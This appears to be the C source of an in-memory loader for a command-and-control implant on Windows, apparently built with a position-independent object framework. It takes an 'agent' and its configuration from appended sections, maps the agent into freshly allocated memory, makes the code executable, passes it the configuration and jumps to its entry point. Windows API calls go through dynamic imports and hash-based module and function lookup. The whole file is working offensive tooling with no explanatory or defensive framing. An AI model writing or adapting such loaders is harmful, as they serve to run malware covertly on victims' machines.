#include <windows.h>
#include "loader.h"
#include "tcg.h"
 
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc   ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
 
#ifdef WIN_X86
__declspec ( noinline ) ULONG_PTR caller ( VOID ) { return ( ULONG_PTR ) WIN_GET_CALLER ( ); }
#endif
 
char __AGENT__  [ 0 ] __attribute__ ( ( section ( "agent"  ) ) );
char __CONFIG__ [ 0 ] __attribute__ ( ( section ( "config" ) ) );

int __tag_setup_config ( );
 
void go ( )
{
    char        * agent_src;
    char        * agent_code;
    char        * agent_data;
    RESOURCE    * config;
    IMPORTFUNCS   funcs;
    DWORD         old_protect;

    /* grab appended agent */
    agent_src = GET_RESOURCE ( __AGENT__ );
 
    /* allocate memory for code and data sections */
    agent_code = allocate_memory ( PicoCodeSize ( agent_src ), PAGE_READWRITE );
    agent_data = allocate_memory ( PicoDataSize ( agent_src ), PAGE_READWRITE );

    /* populate functions */
    funcs.GetProcAddress = GetProcAddress;
    funcs.LoadLibraryA   = LoadLibraryA;

    /* load into memory */
    PicoLoad ( &funcs, agent_src, agent_code, agent_data );

    /* flip code section to RX */
    KERNEL32$VirtualProtect ( agent_code, PicoCodeSize ( agent_src ), PAGE_EXECUTE_READ, &old_protect );

    /* grab appended config */
    config = ( RESOURCE * ) GET_RESOURCE ( __CONFIG__ );

    /* call setup export */
    ( ( AGENT_SETUP ) ( PicoGetExport ( agent_src, agent_code, __tag_setup_config ( ) ) ) ) ( config->val, config->len );

    /* call main entry point */
    PicoEntryPoint ( agent_src, agent_code ) ( ( char * ) &go );
}

LPVOID allocate_memory ( size_t size, DWORD protection )
{
    return KERNEL32$VirtualAlloc ( NULL, size, MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, protection );
}

FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
{
    HANDLE module = findModuleByHash ( mod_hash );
    return findFunctionByHash ( module, func_hash );
}